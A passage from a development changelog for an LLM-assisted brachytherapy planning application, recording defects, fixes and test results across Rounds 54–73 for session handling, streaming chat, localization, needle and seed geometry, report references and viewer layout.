- Node.js syntax checks pass for the modified auth, chat, and workspace
  scripts.
- Local full test suite: **201 passed, 2 skipped, 3 existing SimpleITK
  deprecation warnings**.
- The focused workspace/auth/chat regression tests cover request deadlines,
  bounded recovery, explicit lease-release headers, stream cancellation, and
  late-transition invalidation.

## Round 54 responsive case transitions and complete dynamic UI localization (2026-07-19)

### Confirmed findings

- **The long session transition was a real control-plane/data-plane coupling
  defect.** The browser waited for the full workspace restoration before
  painting a newly created or selected case, while the server selection route
  also hydrated the Python/GPU agent synchronously. CT loading, mesh creation,
  dose-array restoration, and agent construction therefore made New/Switch/
  Delete look unresponsive even though the requested session change had
  already been accepted.
- **The mixed-language clinical evaluation was a real dynamic-rendering
  defect.** Static `data-i18n` nodes changed language, but the metrics,
  observations, OAR review messages, source policy, and empty-state messages
  were generated by JavaScript after the static translation pass and remained
  in English.
- **The prominent split lines were a real presentation issue, not a reason to
  remove resizing.** The resize hit areas are needed for desktop layout
  control, but their idle visual borders unnecessarily made the chat/session
  and chat/viewer regions look like nested panels.

### Corrective changes

- Return a cheap owner-scoped workspace snapshot from create, select, and
  delete responses. The session-selection route no longer constructs a
  hydrated agent; the first status/planning request performs lazy data-plane
  hydration.
- Apply the lightweight snapshot immediately, then schedule the expensive
  restore on the next event-loop turn. Background restoration is generation-
  scoped and is cancelled on a newer transition, so an old CT/mesh callback
  cannot repaint the active case.
- Localize every confirmed dynamic clinical-evaluation string through the
  shared `window._t(zh, en)` helper and re-render it on the global
  `i18nchange` event. This covers metric labels, review observations, OAR
  messages, source policy, no-data states, and the no-CT viewer prompt.
- Preserve resize interaction hit areas but reduce idle divider opacity and
  remove permanent panel borders. The divider becomes visible only on hover
  or while dragging, with no change to the stored layout dimensions.
- Bump the classic-script and stylesheet cache versions so a browser refresh
  cannot keep the previous transition, localization, or divider assets.

### Verification

- Node.js syntax checks pass for the modified workspace and DVH scripts.
- Local full test suite: **203 passed, 2 skipped, 3 existing SimpleITK
  deprecation warnings**.
- Focused workspace/auth/frontend transition suite: **36 passed**.
- Added regression coverage proves that selecting a case does not hydrate an
  agent in the control-plane request and that the global language event
   re-renders the dynamic clinical evaluation.

## Round 55 server-injected image contracts and persistent progress motion (2026-07-19)

### Confirmed findings

- **CTV/OAR segmentation failed before execution.** The agent deliberately
  injects the workspace-owned SimpleITK CT object into `ctv_segmentation` and
  `oar_segmentation` so segmentation uses the session's canonical image
  geometry. Their schemas described `image` as a normal JSON object, while
  `ToolCallGateway` correctly rejected non-mapping values. The resulting
  `Invalid parameter type for image` was a genuine contract mismatch, not a
  model failure or a coordinate-conversion issue.
- **Progress breathing stopped under reduced-motion settings.** The ordinary
  CSS used infinite animations, but the global `prefers-reduced-motion` rules
  changed active/pending progress to one iteration or `none`. This made a
  long-running task visibly pulse once and then appear frozen, even though
  the backend was still working.

### Corrective changes

- Mark only trusted, server-owned segmentation image fields with the explicit
  `x-server-injected` schema annotation. The gateway skips JSON type matching
  for that annotation while retaining strict object validation for all normal
  tool arguments. This preserves the canonical in-memory CT and does not
  broaden LLM-supplied payloads globally.
- Keep the active Todo, pipeline, execution-trace pending state, and thinking
  dots visibly alive until their terminal event. Standard motion remains
  unchanged; reduced-motion mode uses a 2.4-second low-amplitude opacity/shadow
  pulse without row resizing or large transforms.
- Bump the relevant stylesheet cache versions so an existing browser cannot
  silently retain the old one-cycle animation rules.

### Verification

- Added a gateway regression proving an opaque server-injected image is
  accepted while an ordinary object field still rejects a non-mapping value.
- Updated frontend regression assertions for the continuous low-motion
  fallback and persistent active-state classes.
- `git diff --check` passes. The local Windows shell does not have pytest
  installed, so the Python suite is run in the configured remote
  `brachytherapy` environment during deployment verification.

## Round 56 response latency and review-gate optimization (2026-07-19)

### Confirmed findings

- **Short harmless turns paid for an unnecessary remote routing call.** The
  streaming workflow still invoked the multi-agent router unconditionally,
  despite an old comment claiming that short messages were skipped. This was
  a real latency defect, not an intentional clinical safety gate.
- **The direct-tool branch ran completeness review for every direct request.**
  That added avoidable latency to low-risk UI and status operations. Clinical
  planning, segmentation, dose evaluation, evidence-backed clinical advice,
  and external-project research remain reviewed.
- **The browser rendered model draft chunks as an answer before review.**
  Although the server emitted the reviewed `response` event later, the draft
  bubble made the UI look as if BrachyBot answered and then regenerated it.
- **Provider clients were recreated for every request.** Existing retries were
  finite, but repeated client construction discarded HTTP connection pools.

### Corrective changes

- Added `agent_runtime/turn_policy.py` with a conservative local classifier.
  Greetings, thanks, and self-description use local intent classification to
  bypass unnecessary remote routing and completeness review, but the
  configured LLM still generates the answer. Clinical and planning language
  cannot use this bypass.
- Added intent-specific tool allowlists for clinical planning, clinical
  knowledge, external projects, and UI control. The allowlist is applied after
  existing CT/session safety filters, so it cannot re-enable a removed tool.
  External-project requests remain restricted to public web tools and cannot
  fall through to BrachyBot filesystem inspection.
- Kept the existing bounded conversation compaction and added a cache for the
  cleaned session summary. Static system prompts and provider-shaped tool
  schemas are cached with invalidation on registry changes and availability
  changes.
- Buffered `text_chunk` events in the frontend and create the answer bubble
  only on the final reviewed `response` event. The execution trace remains
  available while the answer is being generated and checked.
- Added phase telemetry in `llm_meta.phase_timings_ms` for router, context
  preparation, first token, generation, checker, and final SSE emission.
- Reused OpenAI-compatible and Anthropic clients, capped provider retries at
  two, and retained the configured request timeout. A stream is retried only
  before its first chunk, preventing duplicate partial answers.

### Verification

- Python byte-compilation passes for the changed runtime, workflow, and
  provider modules.
- Node syntax check passes for the modified SSE renderer.
- `git diff --check` passes.
- Added regression coverage for local routing boundaries, external-project
  tool isolation, and tool-schema cache invalidation. The full pytest suite
  must be run in the remote `brachytherapy` environment because the local
  Windows shells do not have pytest installed.

## Round 57: restore LLM-generated small-talk answers (2026-07-19)

### Confirmed finding

- The first latency optimization accidentally made the local classifier an
  answer generator for greetings and self-description requests. This caused
  BrachyBot to emit canned text and skip the configured LLM entirely. It was a
  real product regression: classification and answer generation had been
  coupled.

### Corrective change

- Removed the synchronous and streaming `Local Fast Path` early returns from
  `agent_runtime/chat_workflows.py`. `small_talk` now only means that the
  remote router and completeness checker may be bypassed and that no tool
  schemas are advertised. The configured LLM still receives the user request
  and generates the final answer in the user's language.
- Preserved the empty allowlist semantics in
  `agent_runtime/turn_policy.py`: `None` means unrestricted, while an empty
  set means no tools. This prevents harmless conversational turns from
  loading or calling clinical/filesystem tools without weakening normal LLM
  response generation.
- Updated the README and regression test to document and enforce this
  separation. Clinical planning, clinical advice, and external-project
  research continue to use their existing safety and review gates.

### Verification

- Remote `brachytherapy` environment: `207 passed, 2 skipped, 3 warnings`.
- Changed Python files pass byte-compilation and `git diff --check`.

## Round 58: cross-session viewer cleanup and review-output boundary (2026-07-19)

### Confirmed findings

- Creating or switching a case did clear the tracked Data Tree meshes and the
  clinical evaluation host, but an in-flight 3D segmentation prewarm request
  could still finish later and add an old CTV/OAR surface to the newly selected
  case. This was a real asynchronous workspace-isolation defect.
- The existing 2D render-generation fence covered the server-rendered slice
  path and CT loading, but not all client volume and label-volume responses or
  batch slice preloads. A late response could therefore repopulate a canvas,
  label array, or slice cache after a case transition.
- Reviewer/checker prose was being collected correctly, but was also appended
  verbatim to the user-facing planning response. That made the final answer
  appear to be regenerated after the quality gate and exposed internal review
  wording instead of a single polished answer.

### Corrective changes

- `clearClientWorkspace()` now invalidates segmentation prewarm tasks and
  client-side viewer data loads before clearing the current scene, canvases,
  caches, metrics, report, and Clinical Evaluation panel.
- 3D prewarm jobs capture the current generation and session ID. Their result
  is discarded unless both still match when the mesh response arrives. This
  intentionally does not require aborting the HTTP request: cancellation of
  the mutation is sufficient and avoids unsafe WebGL/fetch teardown.
- Volume loading, label-volume loading, server slice loading, and slice
  preloading now use generation/session checks before mutating data or drawing.
- Reference-direction precedence is centralized in
  `resolve_reference_direction_input()`: explicit auto mode wins over stale
  vectors, while explicit manual mode preserves the current UI vector across
  manual, chat, and re-planning entry points.
- 2D needle overlays now draw only the physical entry-to-slice segment; the
  existing world-coordinate chain remains unchanged and the old cross marker
  is removed.
- Quality-review and completeness-check text is retained as internal memory and
  trace metadata only. The final response remains single-speaker and does not
  print raw reviewer output.

### Verification

- Full local suite: `210 passed, 2 skipped, 3 warnings`.
- Node syntax checks pass for the changed UI/API, viewer-volume, 3D manual, and
  manual-annotation scripts.
- `git diff --check` passes.
- Regression tests cover clinical-panel clearing, stale 2D data callbacks,
  stale 3D mesh callbacks, review-output isolation, auto-reference precedence,
  and entry-clipped needle overlays.

## Round 59: preserve agentic small talk and explicit CTV model selection (2026-07-19)

### Confirmed findings

- The local classifier was a real source of ambiguity: it was allowed to
  bypass the expensive router, but a previous deployment also used that
  classification as a canned-answer path. That made greetings and
  self-description look like mechanical keyword replies and obscured whether
  the configured LLM was actually reachable.
- The manual CTV button had no model selector and posted only `kind` and
  `image_path`. The server therefore could not reliably choose the requested
  CT-based CTV model. Separately, programmatic CT uploads changed the input
  field without firing native input/change events, leaving the manual buttons
  disabled until another user interaction.
- Chinese requests such as “请执行CTV分割” were not consistently routed as
  segmentation, and a clarification answer such as “胰腺” could be treated as
  a generic knowledge turn. Legacy model prompts could also send `tumor_site`
  while the canonical tool contract uses `tumor_type`.

### Corrective changes

- `small_talk` remains an execution policy only: it skips the router and tool
  schemas, but `_run_llm_function_calling` still performs the user-facing
  answer generation whenever a provider is available. When no provider is
  available, both synchronous and streaming paths now show an explicit LLM
  availability error and never emit a canned greeting.
- Added bilingual `ctvModelSelect` options for the production pancreatic
  nnU-Net model and explicitly marked optional research models as requiring
  local weights. The selected stable identifier is sent to the segmentation
  endpoint and persisted through `/api/config`.
- Programmatic CT loading now dispatches input/change events so manual-step
  prerequisites are recomputed immediately. The selector also follows the
  server default (`nnunet_pancreatic`) on startup.
- Added UTF-8-safe segmentation intent aliases, a pending tumor-site
  clarification marker, safe continuation on a site-only follow-up, and
  `tumor_site` compatibility normalization to canonical `tumor_type`.
  Ambiguous CTV requests still stop for user clarification and do not invent a
  model.
- The legacy non-trace `chat()` entry point now follows the same policy: when
  no provider is configured it reports the unavailable LLM explicitly instead
  of falling back to a canned greeting. This keeps all public chat entry
  points consistent.

### Verification

- Full local suite: `213 passed, 2 skipped, 3 warnings`.
- Targeted runtime/workspace/regression suite: `128 passed`.
- Python byte-compilation passes for changed runtime, CTV tool, and route
  modules; Node syntax checks pass for the changed manual and UI API scripts.

## Round 60: live UI auto-reference direction is authoritative (2026-07-20)

### Confirmed finding

The reported symptom was a real precedence defect. The browser correctly
serialized `reference_direc_mode="auto"` and `ref_direc_auto=true`, but a
provider-generated planning tool call could still carry the stale numeric
vector from the form. The unified pipeline accepted that explicit tool
argument before consulting the live UI state. Workflow-enforcer and
auto-recovery paths could also read the session-wide `agent.config` vector,
so a checked Auto control was not guaranteed to survive every planning entry
point. The supplied execution log did not print the resolved direction, so
the log alone cannot prove which vector was used; the code path independently
confirms the precedence bug.

### Corrective changes

- Added `_ui_reference_direction_input()` as the pipeline boundary helper.
  An explicit live UI Auto/Auto-detect mode now resolves to geometric
  auto-detection, while explicit Manual mode resolves to the current numeric
  UI vector. If no UI mode exists, legacy direct-tool/config fallback remains
  available.
- The resolved UI mode is copied into an invocation-local configuration so
  trajectory auto-recovery cannot silently restore a stale session config.
- Added an internal, non-schema user-override marker for the explicit
  reverse-direction replan command, preserving that intentional command
  without allowing ordinary stale LLM arguments to override the checkbox.
- Corrected the planning tool schema to accept either a validated 3-vector or
  the supported `auto`/`auto_detect` string values.
- Added immediate browser-side state synchronization for the four reference
  direction controls, preventing a just-changed checkbox from racing a chat
  request before the next general UI checkpoint.
- Added regression tests for live UI precedence, manual vectors, absent UI
  state, schema support, and the synchronization hook.

### Verification

- Targeted regression suite: `16 passed, 3 warnings`.
- Python byte-compilation passes for `planning_pipeline.py` and `AgenticSys.py`.
- Node syntax check passes for `brachybot-ui-api.js`.

## Round 61: isolate inactive-case deletion from the active workflow (2026-07-20)

### Confirmed finding

The supplied planning log showed a client disconnect immediately before the
active `planning_pipeline` stream was marked stopped. The frontend deletion
handler called `prepareSessionChange()` for every deleted case, including a
case that was not selected. That helper intentionally cancels the current
chat/plan stream, so deleting an unrelated sidebar case could cancel the
active case. The server-side `drop_agent(session_id)` itself is case-scoped;
the cross-case cancellation was in the browser control path.

The same log also confirms that the current planning pipeline did resolve the
live automatic reference direction (`source=live_ui`, geometric entry point)
and rejected obstacle-intersecting trajectory candidates before planning.
Those lines are useful operational evidence and do not indicate a new
coordinate-chain defect.

### Corrective changes

- Non-selected case deletion now uses an independent control-plane path. It
  updates the server session list and sidebar only, without cancelling the
  active SSE/chat stream, clearing the viewer, or restoring another snapshot.
- Deleting the selected case retains the existing guarded transition behavior:
  stop the active turn, persist the case, move it to the recycle bin, and then
  restore the replacement case.
- New-case creation now transfers the current browser's edit lease in the
  create response, avoiding serial release/acquire requests. The transfer is
  owner-token scoped and never releases another browser's lease.
- Empty new cases skip the redundant session-list reload and background agent
  hydration. This keeps a UI-only action from constructing a full
  `BrachyAgent` before the user has loaded a CT.
- Added `applyLeaseResult()` so the client applies the server-provided lease
  state without another round trip.

### Verification

- Static workspace regression checks: `27 passed` when run without pytest.
- Node syntax checks pass for `brachybot-workspace.js` and
  `brachybot-auth.js`.
- Python byte-compilation passes for `session_routes.py` and `server.py`.
- Full Flask integration tests were not runnable in the local Windows
  environment because the available Python environments lack `flask_cors`.
  The remote `brachytherapy` environment passed the focused suite after
  synchronization: `38 passed, 3 warnings`; remote Python byte-compilation
  also passed and the worktree was clean at the published commit.

## Round 62: make persistent status banners explicitly dismissible (2026-07-20)

### Confirmed finding

The blue `Server restarted before the task completed` message is a valid
recovery status, not an error or timeout. The server marks a running operation
as `interrupted` during startup so that an unfinished clinical action is never
reported as completed. The frontend rendered that state as a persistent banner
without a close control, which made a correct status look like a stuck modal.

The same presentation defect existed in the read-only lease notice and in the
stale-asset/cache diagnostic banner. The normal application notification stack
already had an explicit dismiss button, so it did not need a second mechanism.

### Corrective changes

- Added accessible close buttons to the recovery and read-only lease banners.
- Added a dismissible close button to the stale-page diagnostic banner.
- Recovery dismissal is keyed by the current case and interruption record in
  `sessionStorage`; a new interruption remains visible even after an earlier
  one was dismissed.
- Read-only dismissal is scoped to the displayed case and does not change the
  server lease or make the workspace writable. Refreshing the lease continues
  to enforce the authoritative server state.
- Recovery dismissal hides presentation only. It does not clear the
  interrupted checkpoint, mark the operation complete, or suppress rerun
  capability.
- Added frontend regression assertions for all three close paths and for the
  notice-only semantics.

### Verification

- Node syntax checks pass for `brachybot-auth.js`, `brachybot-workspace.js`,
  and `brachybot-ui-api.js`.
- `git diff --check` passes.
- Focused Python tests are executed in the remote `brachytherapy` environment
  because the local Windows Python runtime is missing its standard-library
  `encodings` module.

## Round 63: explicit case lease takeover (2026-07-20)

### Confirmed finding

The read-only conflict was a real product gap, not a false positive. The
lease correctly prevented two browsers from silently overwriting the same
clinical workspace, but the locked browser had no safe recovery action. A
second login could therefore leave the first page unusable until the 75-second
lease expired, and a crashed or forgotten browser could make the delay feel
indefinite.

### Corrective changes

- Added an explicit `Take over editing` action to the read-only banner.
- Added an atomic authenticated lease-transfer path using
  `POST /api/workspace/lease` with `takeover: true`.
- Normal lease acquisition and heartbeat behavior is unchanged: a live owner
  still blocks ordinary acquisition.
- Takeover is scoped to the authenticated user's current case and never
  exposes or records editor tokens in the audit trail.
- The previous browser is not silently treated as writable; its subsequent
  heartbeat or mutation receives the normal lease conflict and becomes
  read-only.
- Added store, route, and frontend regression coverage.

### Safety boundary

Taking over while another browser is actively editing can discard unsaved
client-side UI changes from that browser. The action is therefore explicit and
visible; it does not happen automatically on login. Persisted server
checkpoints remain authoritative and are not deleted by takeover.

## Round 64: render newly created cases immediately (2026-07-20)

### Confirmed finding

The reported delayed sidebar update was a real frontend state synchronization
bug. `POST /api/sessions` returned the new case successfully, but
`newChat()` only changed `activeSessionId` and then called `renderSessionList()`.
The new server entry had never been inserted into the browser's `sessions` map,
so the renderer continued to receive the old list until a later request or
chat action refreshed it.

### Corrective changes

- Added a shared `sessionStateFromPayload()` normalizer for server session
  entries.
- Immediately upsert the authoritative `data.session` returned by creation
  into the client session map before rendering the sidebar.
- Kept the no-extra-list-request optimization and empty-workspace fast path;
  this fixes the visible latency without reintroducing agent hydration.
- Added a regression assertion that the upsert occurs before
  `renderSessionList()`.

### Verification

- Local `node --check` passes for `brachybot-workspace.js`.
- `git diff --check` passes.
- The focused workspace/auth/store suite is rerun remotely after this change.

## Round 65: expose hidden source-verification work (2026-07-20)

### Confirmed finding

The reported progress gap was a real orchestration/UI contract defect. After a
`web_search`, `web_fetch`, or `web_access` step was marked `done`, the runtime
could synchronously run claim extraction and the FactChecker. Claim extraction
may call the configured LLM, and the FactChecker may run another asynchronous
agent call. Neither phase had an Execution Trace event. During that interval
the frontend could show every visible step as complete even though the answer
was still being prepared.

### Corrective changes

- Added a `fact_checker` / `Source Verification` trace step with explicit
  `pending` and terminal `done` or `error` states in the streaming LLM tool
  loop.
- Added the same phase to the direct-tool chat path so both execution modes
  expose identical progress semantics.
- Kept source verification advisory: a checker failure does not discard valid
  search evidence or block the final answer, but it is now visible and
  terminally accounted for.
- Added a readable frontend label for the internal evidence phase and a
  regression test covering both backend paths and the UI mapping.

### UX contract

The final response remains withheld until the post-tool synthesis and any
required completeness/quality review finish. The trace is now allowed to show
`N/(N+1)` with an active source-verification step instead of falsely showing
`N/N` during hidden work.

## Round 66: terminal SSE cleanup and needle-drag confirmation (2026-07-20)

### Confirmed findings

Two independent interaction defects were confirmed from the reported behavior:

1. The chat stream handled the server's terminal `done` event but continued
   reading the HTTP stream. Flask kept the connection reusable, so the browser
   waited until the idle timeout and could report a false `Send failed` after a
   successful answer.
2. A 3D needle endpoint release immediately called the expensive AI dose update
   path. A small accidental drag therefore changed geometry, reprojected seeds,
   and queued repeated calculations without explicit user intent. The accepted
   needle baseline was also initialized too late, after the first drag had
   already mutated the Data Tree.

### Corrective changes

- The frontend exits the SSE reader immediately after processing the terminal
  `done` event. Final response rendering and any requested screenshot upload
  still run within the same logical turn after the reader exits.
- Needle endpoint drag now updates the visible/Data Tree geometry first and
  opens the existing in-app confirmation dialog with explicit `Replan` and
  `Keep position` actions.
- Choosing `Keep position` persists the geometry-only edit and never calls
  `/api/manual_planning/update`.
- Choosing `Replan` submits only the latest coalesced endpoint position and uses
  the last accepted dose geometry as the seed-reprojection baseline. Repeated
  drags while the dialog is open do not create repeated dialogs or requests.
- The accepted algorithm geometry is captured when `seeds_3d` loads, before any
  endpoint can be edited.
- Manual 3D seed meshes now use the active plan's returned `seed_geometry`
  instead of a conflicting hard-coded radius/length pair.
- The default seed geometry is now consistent with `config/default_params.json`:
  radius `0.4 mm` (diameter `0.8 mm`) and length `4.5 mm`; an explicitly stored
  plan geometry still takes precedence.

### Verification

- `node --check` passes for the changed chat, manual-3D, UI API, and viewer
  layout scripts.
- `git diff --check` passes.
- Added static regression coverage for terminal SSE handling, explicit needle
  confirmation, baseline capture, and seed geometry reuse.
- The remote `brachytherapy` environment passes the focused suite: `56 passed,
  3 warnings`. Remote Python byte-compilation passes for the changed route and
  runtime modules. Node syntax checks pass locally; the remote machine does not
  provide the `node` executable.

## Round 67: persist an explicit keep-position needle edit (2026-07-20)

### Confirmed finding

Choosing `Keep position` previously changed the browser scene but did not have
an authoritative server operation for the geometry-only edit. A reload or case
switch could therefore lose the position, and a later replan could use an old
accepted geometry as its seed-reprojection baseline.

### Corrective changes

- Added `/api/manual_planning/update_geometry`, which normalizes patient-world
  endpoints, reuses the current Data Tree non-traversable obstacle validator,
  stores the coherent manual seed/needle snapshot, and creates a recoverable
  workspace checkpoint.
- The endpoint explicitly does not call the dose engine or modify dose/DVH
  results; it reports `dose_recomputed: false` for the UI state machine.
- The frontend now calls this endpoint after the user chooses `Keep position`.
  The accepted returned geometry becomes the next drag/replan baseline, while
  repeated drags continue to share one confirmation prompt.
- Rejected geometry is not persisted. The existing error path restores the last
  accepted safe geometry rather than silently retaining an unsafe edit.

### Verification

- Added a static regression contract for the endpoint, obstacle validation,
  no-dose behavior, and frontend invocation.
- Focused backend tests pass (`56 passed, 3 warnings`); Python compilation,
  JavaScript syntax checks, and `git diff --check` also pass.

## Round 68: canonical 2D needle/seed projection (2026-07-20)

### Confirmed finding

The 2D overlay used the two returned needle endpoints directly and assumed
that `points[0]` was always the deep endpoint and `points[1]` was always the
outside entry endpoint. It also used only those two endpoints to decide the
visible slice range. This was fragile for legacy/manual geometry and for
plans where the validated needle endpoint was rounded or extended slightly
away from the final seed. The result could be a needle that stopped before a
visible seed, or disappeared on the next slice while the seed contour was
still present.

### Corrective changes

- Added one canonical `_needleSliceSegment` projection helper in
  `brachybot-manual-annotation.js`.
- Associated seeds and needles by normalized trajectory identity before
  projection, so a needle is resolved against the particles it carries.
- The helper converts both needle endpoints and associated seed positions
  through the existing world-to-index and MPR orientation chain. It infers
  the outside endpoint from the seed cluster instead of relying on endpoint
  order.
- If a final seed is within the validated needle line but falls just beyond
  an endpoint because of resampling/rounding, the display segment is extended
  only along that same line. No lateral correction or coordinate convention
  change is introduced.
- Slice clipping now handles half-voxel boundary tolerance and needles that
  run parallel to a slice plane. The visible segment remains strictly
  outside-entry to-current-slice, with no endpoint cross marker; the actual
  cylindrical seed contour remains the target-side annotation.
- The 3D geometry and backend safety validator are unchanged. This patch only
  fixes the 2D projection of already validated patient-world geometry.

### Verification

- `node --check` passes for the annotation, volume viewer, and manual 3D
  scripts.
- A focused runtime geometry check passed for reversed endpoint order,
  endpoint truncation before the final seed, and the expected outer-to-slice
  segment.
- Remote focused tests pass: `18 passed, 3 warnings` for the projection,
  workflow, and needle-safety regression subset.

## Round 69: single-locale reports and verified pancreatic references (2026-07-20)

### Confirmed findings

- The report auto-fill path localized the server interpretation, but the
  browser report renderer still appended English secondary headings and English
  report metadata while the global locale was Chinese.
- The pancreatic report template used a generic ASCO journal landing page and
  generated clinical-reference records with placeholder labels such as
  `Clinical criterion source (pancreatic)` and `Verified clinical source`.
  Those labels were not bibliographic records and were not acceptable report
  citations.
- The older CSTRO/CSCO knowledge-base record pointed to a generic society
  homepage and had placeholder publication metadata, even though the actual
  peer-reviewed consensus article is identifiable by PMID/DOI.

### Corrective changes

- Chinese report output is now a single locale: English secondary headings are
  suppressed, the report subtitle/confidentiality/technique labels are Chinese,
  and the byline is localized. Technical identifiers such as CTV, OAR, DVH,
  Gy, and model/checkpoint names remain unchanged because they are scientific
  notation rather than untranslated UI prose.
- Prescription rationale source records now carry verified title, publisher,
  year, and URL metadata. Legacy placeholder records are upgraded or removed
  when a real KB record arrives; a URL-only legacy source is not turned into a
  fabricated title.
- The pancreatic template now uses three site-specific publications:
  `Guidelines for permanent iodine-125 seed interstitial brachytherapy for
  pancreatic cancer (2023 edition): The Chinese expert consensus workshop
  report` (PubMed 39206973), `Chinese expert consensus on radioactive 125I
  seeds interstitial implantation brachytherapy for pancreatic cancer` (DOI
  10.4103/jcrt.JCRT_96_18), and `Preliminary application of 3D-printed
  coplanar template for iodine-125 seed implantation therapy in patients with
  advanced pancreatic cancer` (DOI 10.3748/wjg.v24.i46.5280). Generic
  oncology landing pages are no longer default pancreatic brachytherapy
  references.
- The clinical KB raw record was corrected to the consensus article's real
  authors, journal, year, pages, PMID, DOI, and DOI landing page.
- Unknown numeric OAR labels are no longer presented as anatomical names such
  as `Organ 10000`; they are rendered as an explicit localized unmapped
  structure while preserving the numeric label for traceability.

### Verification

- Added a regression contract for single-locale report rendering, real source
  URLs, source metadata propagation, and removal of placeholder generation.
- `node --check` is required for all changed report scripts; Python compilation
  is required for the report context and server; `git diff --check` must pass.

## Round 70: case-isolated background chat tasks (2026-07-20)

### Confirmed finding

The streaming `/api/chat` route executed `agent.chat_with_stream()` inside the
request-bound Flask generator. When the browser changed cases, the old SSE
connection was closed and `GeneratorExit` set the Agent cancellation flag. The
workflow was therefore genuinely stopped, not merely hidden. Its in-flight
trace and final answer were also absent from the restored browser transcript.

### Corrective changes

- Added `web/chat_tasks.py`, a bounded, session-scoped background task manager.
  Each task is owned by `(user_id, session_id)`, rejects concurrent turns in
  the same case, records ordered SSE events, and retains completed events for
  replay during the server process lifetime.
- `/api/chat` now starts the worker before returning the SSE subscription. A
  client disconnect is logged as a detach and never calls Agent cancellation.
  An explicit `/api/chat/abort` still cancels only the selected case's task.
- Added `/api/chat/task` and `/api/chat/tasks/<task_id>/stream` for secure
  selected-case status lookup and replay. The server never accepts an
  arbitrary client case ID to authorize a task.
- Finalized detached tasks persist the Agent checkpoint, operation status,
  execution trace, user turn, and validated response into the owning workspace.
  Internal uploaded-image paths are removed from the durable user transcript.
- The frontend now detaches the active stream on case switch, keeps hidden
  screenshot follow-ups keyed by their source session, and reconnects to a
  still-running task after the case is selected again. Creating or switching a
  case no longer invokes the Stop path; deleting the active case remains an
  intentional cancellation because its workspace is being removed.
- A start gate orders the initial `running` checkpoint before the worker can
  finish, preventing fast turns from racing and leaving a stale running state.

### Verification

- Added `tests/test_chat_tasks.py` covering ordered replay, ownership
  isolation, explicit cancellation, and same-case concurrency protection.
- Remote full suite: `226 passed, 2 skipped, 3 warnings`.
- Remote Python compilation and `git diff --check` pass.

## Round 71: reconnect chat restoration and case-scoped command history (2026-07-21)

### Confirmed findings

- On browser reconnect, the client waited for `/api/status`, CT reload,
  segmentation/label hydration, dose restoration, and WebGL reconstruction
  before rendering the durable chat snapshot. A valid conversation therefore
  appeared to be missing or stalled even though its workspace was intact.
- `loadSessionChat()` did not clear the shared composer. A draft or command
  from a previously selected case could remain in the input box, and Up/Down
  navigation could appear to return a stale command such as `hi`.
- Manual needle/dose recomputation had a running chat event, but its visual
  state did not clearly identify it as a progress surface and the no-seed early
  return could leave the user without a terminal progress transition.

### Corrective changes

- Added `applyChatSnapshotFast()`. It restores the selected case transcript,
  queued turns, and task identity immediately after the lightweight session
  snapshot. Clinical data and GPU/WebGL hydration remain asynchronous and are
  fenced by the selected-case generation.
- `loadSessionChat()` now clears the composer, binds the input to the selected
  case, rebuilds command history from that case's durable user messages, and
  updates the runtime's last-user-message context. Up/Down navigation remains
  bounded to the active case and restores the partially typed draft after the
  newest entry.
- Manual AI dose/replanning progress now has an explicit `Progress` label, a
  live elapsed timer, an indeterminate animated bar, and a terminal error state
  for an empty-seed request. This is an activity indicator, not a fabricated
  dose-computation percentage.
- A runtime guard now tolerates a missing `activeSessionId` in isolated bridge
  tests and early boot paths rather than throwing while applying a snapshot.

### Verification

- Focused workspace/chat suite: `71 passed, 3 warnings`.
- `node --check` passes for all modified chat, workspace, viewer, annotation,
  and manual-planning scripts.
- `git diff --check` passes. LF/CRLF warnings are Git working-tree
  normalization notices only; no whitespace errors were reported.

## Round 72: viewer geometry after zoom, layout, and fullscreen restore (2026-07-21)

### Confirmed finding

The viewer layout and fullscreen code used separate resize paths. A manual
viewer-height override (`viewer-resized`, `--resize-h`, and inline flex/height)
could survive a layout reset, while fullscreen restore only remeasured the 2D
canvases. During a hidden-to-visible transition the volume renderer could also
fall back to an invented `400 x 300` container size. This produced distorted
2D aspect ratios, small image slivers, or a black/empty viewer after browser
zoom, panel resize, or fullscreen restore. The 3D camera and renderer could
retain the old aspect ratio at the same time.

### Corrective changes

- Added `syncViewerGeometry()`, a shared two-frame layout-settlement path that
  remeasures all three 2D canvases and the 3D renderer without changing camera
  pose or slice values.
- Layout changes and explicit Fit/Reset now clear stale viewer resize CSS
  overrides and schedule the shared geometry synchronization. A panel-level
  `ResizeObserver` covers browser zoom, right-panel resizing, and flex-track
  changes that do not pass through a toolbar layout button.
- Fullscreen restore now unhides only nodes hidden by that fullscreen action,
  preserving intentional visibility state. Both entering and leaving
  fullscreen invoke the shared 2D/3D geometry synchronization.
- Exposed `window.resizeViewer3D()` for camera-aspect and renderer-size
  updates. It deliberately preserves the camera transform; only Fit/Reset may
  reset the view pose.
- Removed the hidden-container `400 x 300` 2D fallback. A hidden canvas waits
  for its `ResizeObserver` notification and is rendered only after its real
  container dimensions are available.

### Verification

- Added a frontend regression contract covering layout override cleanup,
  double-frame synchronization, fullscreen restoration, hidden-container
  deferral, and the 3D resize hook.
- Full Python suite: `228 passed, 2 skipped, 3 warnings`.
- `node --check` passes for the changed viewer scripts and `git diff --check`
  passes.

## Round 73: ISO color propagation and 2D contour redraw (2026-07-21)

### Confirmed finding

The Data Tree color picker already updated the stored dose-level color and the
corresponding 3D mesh, then requested a 2D redraw. However,
`renderDoseContourOnCanvas()` declared `level` inside the preceding
`filter()` callback and referenced it from the later `forEach()` callback.
Every contour redraw therefore raised a client-side `ReferenceError` before
applying the selected dose-level color or painting the contour. This was a
real defect, not an intentional coordinate or rendering policy.

### Corrective changes

- Resolve `contour.level`/`contour.level_rel` inside the contour drawing
  callback where it is consumed.
- Use the same normalized level for Data Tree color matching and the contour
  label, preserving the existing physical coordinate mapping and visibility
  rules.
- Add a regression contract so future color/contour changes cannot move the
  level variable back into an incompatible callback scope.

### Status of the previously reported interaction set

- Needle endpoint capture, press-and-hold filtering, both endpoint handles,
  internal endpoint hover visibility, explicit replan confirmation, restore to
  algorithm geometry, and outside-click context-menu dismissal are implemented
  and covered by frontend regression contracts.
- Seed/needle 2D overlays share the world-to-index transform and clip the
  visible needle at the deepest associated seed; the overlay draws the actual
  seed-cylinder contour rather than a point marker.
- Manual dose/replanning exposes a live indeterminate progress bar, elapsed
  timer, breathing state, queued latest-geometry state, and terminal success/
  error state. This is a client-side manual-dose task indicator; the durable
  server-backed chat task replay applies to chat turns, while a browser-closed
  manual dose request cannot be resumed without a new request.
- Workspace lease takeover and dismissal are explicit, bounded requests; the
  lease banner is presentation-only when dismissed and does not silently grant
  write access.

### Verification

- `node --check` passes for the changed viewer, annotation, manual-planning,
